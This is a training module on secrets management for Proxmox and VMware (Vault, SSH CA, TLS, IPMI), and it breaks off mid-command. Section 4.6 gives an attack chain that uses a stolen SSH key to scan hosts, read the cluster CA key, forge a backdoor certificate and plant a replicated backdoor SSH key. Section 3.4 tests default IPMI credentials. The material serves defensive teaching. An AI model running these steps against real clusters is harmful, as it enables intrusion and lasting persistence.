# Secrets Management for Virtual Infrastructure

> **Modulo del corso:** Migrazione VMware → Proxmox VE
> **Posizione nel percorso:** Fase 9 — Sicurezza avanzata · Modulo 36 (nuovo)
> **Prerequisiti:** moduli 01-02 (fondamenti VMware e Proxmox), modulo 12 (sicurezza e compliance), modulo 20 (hypervisor hardening), modulo 26 (IAM), familiarità con PKI/TLS, HashiCorp Vault basics, Linux PAM, SSH protocol, IaC tools (Terraform, Ansible).
> **Obiettivi di apprendimento.** Al termine del modulo lo studente sarà in grado di:
> 1. mappare tutti i tipi di secrets in un ambiente virtualizzato e identificare i punti di esposizione;
> 2. implementare HashiCorp Vault con HA Raft backend integrato con hypervisor;
> 3. configurare dynamic secrets per vSphere e Proxmox API con rotazione automatica;
> 4. progettare SSH CA architecture per cluster Proxmox eliminando chiavi statiche;
> 5. gestire il lifecycle completo dei certificati TLS per management plane;
> 6. proteggere API tokens con privilege separation e audit logging;
> 7. integrare secrets management in pipeline IaC senza esposizione in git;
> 8. eseguire attacchi a secrets (autorizzati) e implementare contromisure;
> 9. automatizzare rotazione e revoca con policy 30/60/90 giorni;
> 10. costruire un lab completo con Vault PKI, SSH CA, e credential rotation pipeline.
> **Tempo stimato:** lettura 150-200 min · implementazione lab 3-5 giorni · assessment ciclico mensile
> **Livello:** expert (Dreyfus 5); OSCP/GIAC-level offensive security awareness required
> **Ultimo aggiornamento:** 2026-05-07
> **Versioni di riferimento:** HashiCorp Vault 1.17+; Proxmox VE 8.x; VMware vSphere 8.0 U3; Terraform 1.8+; Ansible 2.17+

---

## Mappa concettuale

```
+====================================================================+
|     SECRETS MANAGEMENT FOR VIRTUAL INFRASTRUCTURE                   |
+====================================================================+
|                                                                    |
|   LAYER 1: SECRET TYPES & LOCATIONS                                |
|     API tokens, SSH keys, TLS certs, IPMI creds, join tokens       |
|     vCenter store, /etc/pve/, .vmx, annotations, state files       |
|                                                                    |
|   LAYER 2: CENTRALIZED VAULT                                       |
|     HashiCorp Vault (seal/unseal, Raft HA, policies, namespaces)   |
|     Dynamic secrets, AppRole, Kubernetes auth, Agent sidecar        |
|                                                                    |
|   LAYER 3: HYPERVISOR CREDENTIALS                                  |
|     ESXi root, Proxmox PAM/2FA, vCenter SSO, IPMI/BMC             |
|     Privilege separation, password policies, lockdown               |
|                                                                    |
|   LAYER 4: SSH KEY MANAGEMENT                                      |
|     SSH CA, signed certificates, Vault SSH engine                   |
|     Bastion patterns, key rotation, certificate principals          |
|                                                                    |
|   LAYER 5: TLS CERTIFICATE LIFECYCLE                               |
|     Internal CA (Vault PKI/step-ca/CFSSL), ACME auto-renewal       |
|     Certificate pinning, inter-node TLS, revocation (CRL/OCSP)    |
|                                                                    |
|   LAYER 6: API TOKEN SECURITY                                      |
|     vSphere session mgmt, Proxmox token ID+secret                  |
|     Least-privilege roles, audit logging, automated rotation        |
|                                                                    |
|   LAYER 7: IaC SECRETS PROTECTION                                  |
|     SOPS/age, Terraform state encryption, sealed-secrets           |
|     GitOps external-secrets-operator, .gitignore enforcement        |
|                                                                    |
|   LAYER 8: ATTACK VECTORS                                          |
|     Memory scraping, config extraction, Golden SAML                |
|     Credential relay, VMX file parsing, /proc exposure             |
|                                                                    |
|   LAYER 9: ROTATION & REVOCATION                                   |
|     30/60/90 day policies, emergency rotation, Vault TTL/leases    |
|     CRL distribution, OCSP responder, breach response              |
|                                                                    |
+====================================================================+
```

---

## 1. Secrets Landscape in Virtualization

### 1.1 Taxonomy of Secrets in Virtual Environments

A virtualization platform generates and consumes an extraordinary density of secrets. Unlike application-layer secrets (database passwords, API keys for SaaS services), infrastructure secrets grant access to the entire compute fabric — a single leaked hypervisor credential can expose every VM, every network segment, every stored dataset.

| Secret Type | Examples | Risk Level | Typical Location |
|---|---|---|---|
| **Hypervisor root credentials** | ESXi root password, Proxmox root/pam | Critical | PAM shadow, DCUI, vCenter DB |
| **API tokens** | vSphere session cookies, Proxmox API tokens | High | Memory, config files, automation scripts |
| **SSH keys** | Node-to-node cluster keys, admin access keys | Critical | ~/.ssh/, /etc/pve/priv/, authorized_keys |
| **TLS certificates + private keys** | pveproxy.pem, hostd.cert, vCenter VMCA | High | /etc/pve/nodes/, /etc/vmware-vpx/ |
| **IPMI/iDRAC/BMC credentials** | Dell iDRAC root, HPE iLO admin | Critical | IPMI config, spreadsheets, CMDB |
| **Storage backend passwords** | Ceph keyring, iSCSI CHAP, NFS Kerberos keytab | High | /etc/ceph/, /etc/pve/storage.cfg |
| **Cluster join tokens** | Proxmox cluster join info, vCenter trust tokens | High | /etc/pve/corosync.conf, join scripts |
| **Backup encryption keys** | PBS encryption key, Veeam credentials | Critical | PBS config, key files, password managers |
| **SAML/OIDC secrets** | vCenter SSO signing cert, IdP shared secrets | Critical | vCenter DB, SSO config directory |
| **VM-embedded secrets** | .vmx annotations, cloud-init userdata, guest agent | Variable | Datastore files, VM metadata |

### 1.2 Where Secrets Live: Discovery Map

#### VMware vSphere

```
# vCenter Server Appliance (VCSA)
/etc/vmware-vpx/vpxd.cfg                  # Database password (encrypted, key in same FS)
/etc/vmware-vpx/ssl/                      # vCenter SSL certificates
/etc/vmware-sso/keys/                     # SSO signing certificates (Golden SAML target)
/storage/db/vpostgres/                    # Embedded PostgreSQL with all creds
/var/log/vmware/vpxd/vpxd-*.log           # May contain session tokens in debug mode

# ESXi Host
/etc/vmware/hostd/config.xml              # Encrypted passwords
/etc/vmware/esx.conf                      # Host configuration with encoded creds
/vmfs/volumes/<datastore>/*.vmx           # VM config — may embed passwords
/vmfs/volumes/<datastore>/*.nvram         # vTPM state (contains sealing keys)
/.ssh/authorized_keys                     # SSH access (if enabled)

# Credential Store (vim-cmd)
vim-cmd hostsvc/advopt/list | grep -i pass
esxcli system account list                # Local accounts
```

#### Proxmox VE

```
# Cluster-wide secrets (replicated via pmxcfs)
/etc/pve/authkey.pub                      # Cluster auth public key
/etc/pve/pve-root-ca.pem                  # Root CA certificate
/etc/pve/priv/pve-root-ca.key            # ROOT CA PRIVATE KEY (critical!)
/etc/pve/priv/authkey.key                 # Cluster auth private key
/etc/pve/nodes/<node>/pve-ssl.pem         # Node certificate
/etc/pve/nodes/<node>/pve-ssl.key         # Node private key
/etc/pve/storage.cfg                      # Storage passwords (CHAP, Ceph keys)
/etc/pve/corosync.conf                    # Cluster ring addresses
/etc/pve/user.cfg                         # User definitions
/etc/pve/priv/shadow.cfg                  # User password hashes (PVE realm)
/etc/pve/.rrd                             # Not secrets but cluster state

# Node-local secrets
/etc/ceph/ceph.client.admin.keyring       # Ceph admin keyring
/etc/pve/priv/lock/                       # Lock files (not secrets)
/root/.ssh/                               # SSH keys for cluster communication
/etc/pbs/.secrets                         # PBS remote connection credentials

# API tokens (stored in user.cfg)
# Format: user@realm!tokenid = <privilege-separated-secret>
```

### 1.3 Secret Sprawl: The Scaling Problem

In environments with 50+ hypervisors and hundreds of VMs, secret sprawl becomes the primary security risk:

**Sprawl Indicators:**
- Same SSH key deployed to all nodes via Ansible without rotation
- IPMI passwords identical across racks ("factory default" syndrome)
- Service accounts with static passwords shared across automation tools
- TLS certificates with 10-year validity (or self-signed with no CA)
- Backup encryption keys stored alongside the backups themselves
- Terraform state files with plaintext credentials in S3 (no encryption)

**Quantifying the Problem:**

```bash
# Audit: count unique secrets in a 20-node Proxmox cluster
# SSH keys
find /etc/pve/nodes/ -name "*.key" | wc -l           # Certificate keys
cat /root/.ssh/authorized_keys | wc -l                # SSH authorized entries
grep -r "password\|secret\|token" /etc/pve/ 2>/dev/null | wc -l

# Estimate: 20-node cluster, typical sprawl
# - 20 root passwords (often identical)
# - 20 node TLS key pairs
# - 1 CA key pair
# - 1 cluster auth key pair
# - 3-5 storage backend credentials
# - 20+ SSH keys (admin, automation, monitoring)
# - 5-10 API tokens
# - 20 IPMI/BMC credentials
# Total: 100-120 secrets minimum, likely 200+ with VM-embedded
```

**Rotation Challenges:**
1. **Cluster quorum dependency** — Cannot rotate Corosync auth keys without risking cluster split
2. **Cascading failures** — Storage password rotation must be atomic across all nodes
3. **Downtime windows** — Certificate renewal on management plane causes brief API unavailability
4. **Automation coupling** — CI/CD pipelines break when static credentials rotate
5. **Key escrow gaps** — Who holds the backup encryption key if the admin leaves?

---

## 2. HashiCorp Vault Integration

### 2.1 Vault Architecture for Virtual Infrastructure

Vault serves as the centralized secrets management platform for the entire virtualization stack. The architecture must be HA, auto-unsealing, and deeply integrated with both hypervisor layers.

```
+-------------------------------------------------------------------+
|                    VAULT CLUSTER (Raft HA)                          |
|                                                                    |
|   +----------+    +----------+    +----------+                    |
|   | Vault-1  |<-->| Vault-2  |<-->| Vault-3  |                    |
|   | (Leader) |    | (Standby)|    | (Standby)|                    |
|   +----------+    +----------+    +----------+                    |
|        |                                                           |
|   [Auto-Unseal: Transit / AWS KMS / GCP CKMS / TPM]              |
|                                                                    |
+-------------------------------------------------------------------+
         |                    |                    |
    +---------+         +---------+         +---------+
    | PVE     |         | vCenter |         | CI/CD   |
    | Nodes   |         | Server  |         | Pipeline|
    | (Agent) |         | (AppRole|         | (JWT    |
    |         |         |  auth)  |         |  auth)  |
    +---------+         +---------+         +---------+
```

### 2.2 Full Deployment: Vault with Raft HA Backend

#### Prerequisites and Installation

```bash
# On each Vault node (3 nodes minimum for HA)
# Using official HashiCorp repository
wget -O- https://apt.releases.hashicorp.com/gpg | gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" \
  > /etc/apt/sources.list.d/hashicorp.list
apt update && apt install -y vault=1.17.3-1

# Verify installation
vault version
# Vault v1.17.3 (...)
```

#### Vault Server Configuration (vault-1)

```hcl
# /etc/vault.d/vault.hcl — Node 1 (repeat with adjusted addresses for nodes 2,3)

cluster_name = "infra-vault"
log_level    = "info"

storage "raft" {
  path    = "/opt/vault/data"
  node_id = "vault-1"

  retry_join {
    leader_api_addr = "https://vault-2.infra.internal:8200"
  }
  retry_join {
    leader_api_addr = "https://vault-3.infra.internal:8200"
  }
}

listener "tcp" {
  address       = "0.0.0.0:8200"
  cluster_address = "0.0.0.0:8201"
  tls_cert_file = "/opt/vault/tls/vault-1.crt"
  tls_key_file  = "/opt/vault/tls/vault-1.key"
  tls_client_ca_file = "/opt/vault/tls/ca.crt"
  tls_min_version = "tls13"
}

# Auto-unseal using Transit (another Vault) or cloud KMS
# For air-gapped environments: use TPM2 PKCS#11 via vault-plugin-seal-pkcs11
seal "transit" {
  address         = "https://root-vault.infra.internal:8200"
  token           = ""  # Populated via environment variable
  disable_renewal = false
  key_name        = "autounseal-infra"
  mount_path      = "transit/"
  tls_ca_cert     = "/opt/vault/tls/root-ca.crt"
}

api_addr      = "https://vault-1.infra.internal:8200"
cluster_addr  = "https://vault-1.infra.internal:8201"

# Telemetry for monitoring
telemetry {
  prometheus_retention_time = "30s"
  disable_hostname          = true
}

# UI enabled for initial setup only — disable in production hardened mode
ui = false

# Performance tuning
max_lease_ttl     = "768h"   # 32 days max
default_lease_ttl = "24h"
```

#### Initialization and Unseal

```bash
# Initialize the cluster (run once on first node)
export VAULT_ADDR="https://vault-1.infra.internal:8200"
export VAULT_CACERT="/opt/vault/tls/ca.crt"

vault operator init \
  -key-shares=5 \
  -key-threshold=3 \
  -format=json > /root/vault-init-keys.json

# CRITICAL: Store unseal keys in separate secure locations
# - Key 1: HSM or hardware token
# - Key 2: Secure offline storage (safe deposit box)
# - Key 3: Different physical location
# - Key 4-5: Recovery keys held by different personnel
# NEVER store all keys together. NEVER store them on the Vault server.

# With auto-unseal configured, Vault auto-unseals on restart.
# The init keys become recovery keys for seal migration.

# Verify cluster status
vault status
vault operator raft list-peers
```

### 2.3 Dynamic Secrets for VMware (vSphere Secret Engine)

The VMware vSphere secret engine is community-maintained but the pattern for dynamic credentials applies universally.

```bash
# Enable the vSphere secrets engine (custom plugin or wrapper approach)
vault secrets enable -path=vsphere -plugin-name=vault-plugin-secrets-vsphere plugin

# Configure connection to vCenter
vault write vsphere/config/connection \
  url="https://vcenter.infra.internal" \
  username="vault-admin@vsphere.local" \
  password="$(cat /run/secrets/vcenter-vault-pw)" \
  insecure_ssl=false \
  tls_ca_cert="@/opt/vault/tls/vcenter-ca.crt"

# Create a role for limited VM management
vault write vsphere/roles/vm-operator \
  ttl="1h" \
  max_ttl="4h" \
  permissions='[
    "VirtualMachine.Interact.PowerOn",
    "VirtualMachine.Interact.PowerOff",
    "VirtualMachine.Interact.ConsoleInteract",
    "VirtualMachine.State.CreateSnapshot",
    "VirtualMachine.State.RemoveSnapshot"
  ]' \
  datacenter="DC-Production" \
  folder="/Production/Workloads"

# Generate dynamic credentials (ephemeral vCenter user)
vault read vsphere/creds/vm-operator
# Key          Value
# lease_id     vsphere/creds/vm-operator/7x8y...
# lease_duration  1h
# username     vault-vm-op-a7f3c2
# password     dK#9xR...mP2w
```

**Alternative: Use Vault's Generic Database Engine with Custom Plugins**

For environments without a dedicated vSphere engine, wrap PowerCLI:

```bash
# Custom rotation script called by Vault
# /opt/vault/scripts/vsphere-rotate.sh
#!/bin/bash
set -euo pipefail

VCENTER_URL="$1"
USERNAME="$2"
NEW_PASSWORD="$3"

pwsh -NoProfile -Command "
  Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -Confirm:\$false
  Connect-VIServer -Server '$VCENTER_URL' -User 'vault-rotator@vsphere.local' -Password (Get-Content /run/secrets/rotator-pw)
  Set-VMHostAccount -UserAccount '$USERNAME' -Password '$NEW_PASSWORD'
  Disconnect-VIServer -Confirm:\$false
"
```

### 2.4 Vault Agent for Proxmox Nodes

Deploy Vault Agent as a sidecar on every Proxmox node for automatic secret retrieval and certificate renewal.

```hcl
# /etc/vault-agent.d/agent.hcl — On each Proxmox node

vault {
  address = "https://vault.infra.internal:8200"
  tls_ca_cert = "/etc/vault-agent.d/ca.crt"
}

auto_auth {
  method "approle" {
    mount_path = "auth/approle"
    config = {
      role_id_file_path   = "/etc/vault-agent.d/role-id"
      secret_id_file_path = "/etc/vault-agent.d/secret-id"
      remove_secret_id_file_after_reading = true
    }
  }

  sink "file" {
    config = {
      path = "/run/vault-agent/token"
      mode = 0640
    }
  }
}

cache {
  use_auto_auth_token = true
}

# Template: Render Proxmox node certificate
template {
  source      = "/etc/vault-agent.d/templates/pve-ssl.tpl"
  destination = "/etc/pve/local/pveproxy-ssl.pem"
  perms       = 0640
  command     = "systemctl reload pveproxy"
}

template {
  source      = "/etc/vault-agent.d/templates/pve-ssl-key.tpl"
  destination = "/etc/pve/local/pveproxy-ssl.key"
  perms       = 0600
  command     = "systemctl reload pveproxy"
}

# Template: Render Ceph keyring
template {
  source      = "/etc/vault-agent.d/templates/ceph-keyring.tpl"
  destination = "/etc/ceph/ceph.client.admin.keyring"
  perms       = 0600
}
```

**Template File for TLS Certificate:**

```gotemplate
{{/* /etc/vault-agent.d/templates/pve-ssl.tpl */}}
{{ with secret "pki/issue/proxmox-node" "common_name=pve-node01.infra.internal" "alt_names=pve-node01,pve-node01.lan" "ttl=720h" }}
{{ .Data.certificate }}
{{ .Data.issuing_ca }}
{{ end }}
```

### 2.5 AppRole Authentication for Automation

```bash
# Enable AppRole auth method
vault auth enable approle

# Create policy for Proxmox nodes
vault policy write proxmox-node - <<'EOF'
# Read PKI certificates
path "pki/issue/proxmox-node" {
  capabilities = ["create", "update"]
}

# Read storage credentials
path "secret/data/infrastructure/storage/*" {
  capabilities = ["read"]
}

# Read SSH signing
path "ssh-client-signer/sign/proxmox-admin" {
  capabilities = ["create", "update"]
}

# Renew own token
path "auth/token/renew-self" {
  capabilities = ["update"]
}
EOF

# Create AppRole for Proxmox nodes
vault write auth/approle/role/proxmox-node \
  token_policies="proxmox-node" \
  token_ttl=1h \
  token_max_ttl=4h \
  secret_id_ttl=24h \
  secret_id_num_uses=1 \
  bind_secret_id=true

# Retrieve role-id (static, deploy via secure channel)
vault read -field=role_id auth/approle/role/proxmox-node/role-id

# Generate wrapped secret-id (one-time use)
vault write -wrap-ttl=300s -f auth/approle/role/proxmox-node/secret-id
```

### 2.6 Kubernetes Auth for VM Workloads

For VMs running Kubernetes (or workloads needing Vault access):

```bash
# Enable Kubernetes auth
vault auth enable -path=k8s-prod kubernetes

# Configure with cluster CA and service account
vault write auth/k8s-prod/config \
  kubernetes_host="https://k8s-api.infra.internal:6443" \
  kubernetes_ca_cert="@/opt/vault/tls/k8s-ca.crt" \
  token_reviewer_jwt="@/run/secrets/vault-reviewer-token"

# Create role for application pods
vault write auth/k8s-prod/role/app-secrets \
  bound_service_account_names="app-sa" \
  bound_service_account_namespaces="production" \
  policies="app-secrets-read" \
  ttl=1h
```

---

## 3. Hypervisor Credential Security

### 3.1 ESXi Root Password Management

ESXi root access is the "god mode" of the VMware stack. Compromise equals total infrastructure control.

**Hardening Steps:**

```bash
# 1. Set complex password via DCUI or PowerCLI
# Minimum 16 characters, mixed case, numbers, special chars
# ESXi default policy: /etc/pam.d/passwd
# retry=3 min=disabled,disabled,disabled,7,7

# 2. Configure password complexity via esxcli
esxcli system account set -i root -p 'OldP@ss' -n 'N3w$ecur3P@55w0rd!2026'

# 3. Lockdown Mode — Normal (recommended minimum)
vim-cmd hostsvc/advopt/update UserVars.ESXiShellInteractiveTimeOut long 300
vim-cmd hostsvc/advopt/update UserVars.ESXiShellTimeOut long 600

# Enable lockdown via PowerCLI
Get-VMHost | Get-View | ForEach-Object {
  $lockdown = Get-View $_.ConfigManager.HostAccessManager
  $lockdown.ChangeLockdownMode('lockdownNormal')
}

# 4. Disable SSH and ESXi Shell by default
vim-cmd hostsvc/advopt/update UserVars.SuppressShellWarning long 0
esxcli system ssh set --enabled false

# 5. Configure Active Directory join for named accounts
esxcli system account list
# Prefer AD integration over local root access

# 6. Enable account lockout
esxcli system security lockout set --lock-failures 5 --unlock-time 900
```

**DCUI Lockdown:**

```
# Disable DCUI for all but exception users
# vCenter → Host → Configure → System → Security Profile → Lockdown Mode
# Exception Users: vpxuser (vCenter managed), emergency-admin@vsphere.local
```

### 3.2 Proxmox Root and PAM Authentication

```bash
# 1. Enforce strong root password
passwd root  # Set 20+ char passphrase

# 2. Disable direct root SSH (use sudo user or API tokens)
# /etc/ssh/sshd_config
PermitRootLogin prohibit-password  # Allow key-only, deny password

# 3. Configure Two-Factor Authentication (TOTP)
# Via web UI: Datacenter → Permissions → Two Factor
# Or via CLI:
pveum user modify root@pam -totp "OATH:$(oathtool --totp -v --base32 < /dev/urandom | head -1)"

# 4. WebAuthn/U2F for hardware token
# /etc/pve/datacenter.cfg — add:
# u2f: appid=https://pve.infra.internal:8006,origin=https://pve.infra.internal:8006

# 5. Create privilege-separated admin accounts
pveum user add admin@pam --comment "Infrastructure Admin"
pveum group add infra-admins --comment "Infrastructure Administrators"
pveum user modify admin@pam -group infra-admins
pveum acl modify / --roles Administrator --groups infra-admins

# 6. API Token with reduced privileges (no full admin)
pveum user token add admin@pam automation --privsep 1 --expire $(($(date +%s) + 7776000))
# Output:
# ┌──────────────┬──────────────────────────────────────────┐
# │ key          │ value                                    │
# ├──────────────┼──────────────────────────────────────────┤
# │ full-tokenid │ admin@pam!automation                     │
# │ info         │ {"privsep":"1","expire":"1752345600"}    │
# │ value        │ aabbccdd-1122-3344-5566-778899aabbcc    │
# └──────────────┴──────────────────────────────────────────┘

# 7. PAM hardening — /etc/pam.d/common-auth
# Add faillock module
auth required pam_faillock.so preauth silent deny=5 unlock_time=900
auth [success=1 default=bad] pam_unix.so
auth [default=die] pam_faillock.so authfail deny=5 unlock_time=900
auth sufficient pam_faillock.so authsucc deny=5 unlock_time=900
```

### 3.3 vCenter SSO Domain Security

```bash
# vCenter SSO is the identity hub for the entire vSphere environment
# Default domain: vsphere.local

# 1. Change default administrator@vsphere.local password
# Use 20+ character passphrase

# 2. Configure password policy
# vSphere Client → Administration → Single Sign-On → Configuration → Password Policy
# Recommended settings:
#   Max lifetime: 90 days
#   Min length: 16
#   Max identical adjacent chars: 3
#   History: 12 passwords
#   Lockout: 5 failures, 15-minute unlock

# 3. Add external identity source (AD/LDAP/OIDC)
# Administration → Single Sign-On → Configuration → Identity Provider
# Prefer OIDC with MFA-enforced IdP (Okta, Azure AD, Keycloak)

# 4. Audit SSO signing certificate
# The SSO signing certificate is the Golden SAML attack target
# Location: /storage/db/vmware-vmdir/data.mdb (embedded in Directory Service DB)

# 5. Rotate SSO signing certificate
# /usr/lib/vmware-vmdir/bin/dir-cli trustedcert list
# Replace with new cert, update all trust relationships

# 6. Remove default solution users that are unused
# Check: Administration → Single Sign-On → Users and Groups → Solution Users
```

### 3.4 IPMI/BMC Credential Rotation

```bash
# IPMI/iDRAC/iLO credentials are frequently forgotten and rarely rotated
# They provide out-of-band hardware access — equivalent to physical console

# 1. Discover IPMI endpoints
nmap -sU -p 623 10.0.0.0/24 --open -oG ipmi-scan.txt

# 2. Audit default credentials (authorized pentest)
# Common defaults: admin/admin, ADMIN/ADMIN, root/calvin (Dell iDRAC)
ipmitool -I lanplus -H 10.0.0.50 -U root -P calvin chassis status

# 3. Rotate via ipmitool (scripted)
#!/bin/bash
# rotate-ipmi.sh — Rotate IPMI passwords across all BMC endpoints
HOSTS_FILE="/etc/vault-agent.d/ipmi-hosts.txt"
NEW_PASS=$(vault kv get -field=password secret/infrastructure/ipmi/current)

while IFS=, read -r host user; do
  echo "[*] Rotating $user on $host"
  ipmitool -I lanplus -H "$host" -U "$user" -P "$OLD_PASS" \
    user set password 2 "$NEW_PASS"
  if [ $? -eq 0 ]; then
    echo "[+] Success: $host"
  else
    echo "[-] FAILED: $host" >&2
  fi
done < "$HOSTS_FILE"

# 4. Network isolation for IPMI
# IPMI MUST be on a dedicated, isolated management VLAN
# No routing to production networks
# Firewall rules: only allow from jump host / management workstation
# Example iptables on management gateway:
iptables -A FORWARD -s 10.99.0.0/24 -d 10.0.100.0/24 -p udp --dport 623 -j ACCEPT
iptables -A FORWARD -d 10.0.100.0/24 -j DROP

# 5. Disable IPMI over LAN when not needed
ipmitool -I lanplus -H 10.0.0.50 -U admin -P "$PASS" lan set 1 access off
```

---

## 4. SSH Key Management

### 4.1 SSH Certificate Authority Architecture

Static SSH keys are the most common vector for lateral movement in hypervisor clusters. A single stolen private key grants persistent access to all nodes listing that public key in `authorized_keys`. SSH Certificate Authority (CA) eliminates this by issuing short-lived signed certificates.

```
+-------------------------------------------------------------------+
|                    SSH CA ARCHITECTURE                              |
+-------------------------------------------------------------------+
|                                                                    |
|   [Vault SSH Secret Engine]                                        |
|        |                                                           |
|        v                                                           |
|   +----------------+     Issues short-lived certs (8h TTL)         |
|   | SSH CA Signing |---> signed user certificates                  |
|   | Key (in Vault) |---> signed host certificates                  |
|   +----------------+                                               |
|        |                                                           |
|   +----+----+----+----+----+                                       |
|   |    |    |    |    |    |                                        |
|   v    v    v    v    v    v                                        |
| pve01 pve02 pve03 pve04 pve05 ...                                 |
| (trust CA public key in sshd_config)                               |
| (present signed host cert to clients)                              |
|                                                                    |
+-------------------------------------------------------------------+
```

### 4.2 Vault SSH Secret Engine Configuration

```bash
# Enable SSH secret engine for client key signing
vault secrets enable -path=ssh-client-signer ssh

# Configure CA (Vault generates or you import existing)
vault write ssh-client-signer/config/ca generate_signing_key=true

# Retrieve the CA public key (distribute to all nodes)
vault read -field=public_key ssh-client-signer/config/ca > /tmp/trusted-user-ca-keys.pub

# Create role for Proxmox administrators
vault write ssh-client-signer/roles/proxmox-admin \
  key_type="ca" \
  default_user="root" \
  allowed_users="root,admin,pveadmin" \
  allowed_extensions="permit-pty,permit-agent-forwarding" \
  default_extensions='{"permit-pty":""}' \
  ttl="8h" \
  max_ttl="24h" \
  allow_user_certificates=true \
  algorithm_signer="rsa-sha2-512"

# Enable host key signing
vault secrets enable -path=ssh-host-signer ssh
vault write ssh-host-signer/config/ca generate_signing_key=true
vault read -field=public_key ssh-host-signer/config/ca > /tmp/host-ca-keys.pub

# Sign a host key
vault write ssh-host-signer/sign/proxmox-hosts \
  cert_type=host \
  public_key=@/etc/ssh/ssh_host_ed25519_key.pub \
  valid_principals="pve-node01.infra.internal,pve-node01,10.0.1.11" \
  ttl="8760h"
```

### 4.3 Node Configuration for SSH CA

```bash
# On each Proxmox node: /etc/ssh/sshd_config.d/ca-auth.conf

# Trust the Vault-issued user CA
TrustedUserCAKeys /etc/ssh/trusted-user-ca-keys.pub

# Present signed host certificate
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub

# Disable raw authorized_keys (force CA auth)
AuthorizedKeysFile none

# Restrict principals
AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u

# Revocation list
RevokedKeys /etc/ssh/revoked-keys

# Harden sshd
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
AllowGroups ssh-admins

# Reload sshd
systemctl reload sshd
```

**Principal Configuration:**

```bash
# /etc/ssh/auth_principals/root
proxmox-admin
emergency-access

# /etc/ssh/auth_principals/pveadmin
proxmox-admin
monitoring-ro
```

### 4.4 Client-Side Certificate Request

```bash
# Administrator requests a signed certificate from Vault
# 1. Generate ephemeral key pair
ssh-keygen -t ed25519 -f /tmp/ephemeral -N "" -C "admin session $(date -Iseconds)"

# 2. Sign with Vault
vault write -field=signed_key ssh-client-signer/sign/proxmox-admin \
  public_key=@/tmp/ephemeral.pub \
  valid_principals="root,pveadmin" \
  extensions='{"permit-pty":"","permit-agent-forwarding":""}' \
  > /tmp/ephemeral-cert.pub

# 3. Verify certificate contents
ssh-keygen -L -f /tmp/ephemeral-cert.pub
# Type: ssh-ed25519-cert-v01@openssh.com user certificate
# Public key: ED25519-CERT SHA256:...
# Signing CA: RSA SHA256:... (trusted-user-ca-keys.pub)
# Valid: from 2026-05-07T10:00:00 to 2026-05-07T18:00:00 (8h)
# Principals: root, pveadmin
# Extensions: permit-pty, permit-agent-forwarding

# 4. Connect using signed certificate
ssh -i /tmp/ephemeral -o CertificateFile=/tmp/ephemeral-cert.pub root@pve-node01.infra.internal

# 5. Cleanup (certificate is short-lived anyway)
rm -f /tmp/ephemeral /tmp/ephemeral.pub /tmp/ephemeral-cert.pub
```

### 4.5 Bastion/Jump Host Pattern

```
+--------+     +----------+     +-----------+
| Admin  |---->| Bastion  |---->| PVE Nodes |
| Laptop |     | (SSH CA) |     | (no direct|
+--------+     +----------+     |  access)  |
    |               |           +-----------+
    |               |
    v               v
  [Vault]     [Audit Log]
  (sign cert)  (all sessions recorded)
```

```bash
# Bastion host configuration — /etc/ssh/sshd_config
AllowTcpForwarding yes
PermitTunnel no
X11Forwarding no
ForceCommand /usr/local/bin/session-recorder.sh

# Only bastion can reach hypervisor management network
# iptables on network gateway:
iptables -A FORWARD -s 10.0.50.10/32 -d 10.0.1.0/24 -p tcp --dport 22 -j ACCEPT
iptables -A FORWARD -d 10.0.1.0/24 -p tcp --dport 22 -j DROP
```

### 4.6 Attack Scenario: Stolen SSH Keys → Full Cluster Compromise

**Attack Chain (authorized pentest demonstration):**

```
PHASE 1: Initial Access
─────────────────────────
Attacker obtains ~/.ssh/id_ed25519 from developer laptop (phishing, malware, repo leak)

$ ssh-keygen -l -f stolen_key
256 SHA256:xY7... admin@company (ED25519)

PHASE 2: Discovery
─────────────────────────
# Scan for hosts accepting this key
$ for host in $(cat targets.txt); do
    ssh -o BatchMode=yes -o ConnectTimeout=3 -i stolen_key root@$host 'hostname' 2>/dev/null && \
      echo "ACCESS: $host"
  done
# Result: ACCESS on pve-node01 through pve-node20 (same key everywhere)

PHASE 3: Lateral Movement
─────────────────────────
$ ssh -i stolen_key root@pve-node01
root@pve-node01:~# pvecm status       # Full cluster access
root@pve-node01:~# cat /etc/pve/storage.cfg    # Storage credentials
root@pve-node01:~# cat /etc/pve/priv/pve-root-ca.key  # CA private key!

PHASE 4: Persistence & Escalation
─────────────────────────
# Generate new CA-signed node certificate (backdoor CA access)
root@pve-node01:~# openssl req -new -key /tmp/backdoor.key \
  -out /tmp/backdoor.csr -subj "/CN=pve-backdoor.infra.internal"
root@pve-node01:~# openssl x509 -req -in /tmp/backdoor.csr \
  -CA /etc/pve/pve-root-ca.pem -CAkey /etc/pve/priv/pve-root-ca.key \
  -CAcreateserial -out /tmp/backdoor.crt -days 3650

# Implant SSH key in cluster-replicated authorized_keys
root@pve-node01:~# echo "ssh-ed25519 AAAA... backdoor" >> /etc/pve/priv/authorized_keys
# This replicates to ALL nodes via pmxcfs

PHASE 5: Impact
─────────────────────────
- Full access to all VMs (qm terminal, live migration hijack)
- Access to all storage backends (Ceph keys, iSCSI passwords)
- Ability to issue trusted certificates (CA key compromise)
- Ability to snapshot/exfiltrate any VM disk
- Cluster-wide persistence via replicated config
```

**Mitigation: SSH CA eliminates this entire chain** — no static keys to steal, certificates expire in hours, revocation is immediate.

---

## 5. TLS Certificate Lifecycle

### 5.1 Internal CA Architecture

For hypervisor management planes, an internal CA provides better control than public CAs while avoiding self-signed certificate risks.

**Option Comparison:**

| CA Solution | Pros | Cons | Best For |
|---|---|---|---|
| Vault PKI | Dynamic issuance, auto-rotation, audit trail, HA | Complexity, Vault dependency | Production clusters |
| step-ca | Lightweight, ACME support, good for small deployments | Single-point, less enterprise features | Lab/small environments |
| CFSSL | Simple API, CloudFlare proven | Limited lifecycle management | CI/CD cert generation |
| Easy-RSA | Dead simple | No automation, manual process | One-off certificates |

### 5.2 Vault PKI Engine Configuration

```bash
# Enable PKI engine for Root CA
vault secrets enable -path=pki pki
vault secrets tune -max-lease-ttl=87600h pki  # 10 years

# Generate Root CA
vault write -field=certificate pki/root/generate/internal \
  common_name="Infrastructure Root CA" \
  issuer_name="root-2026" \
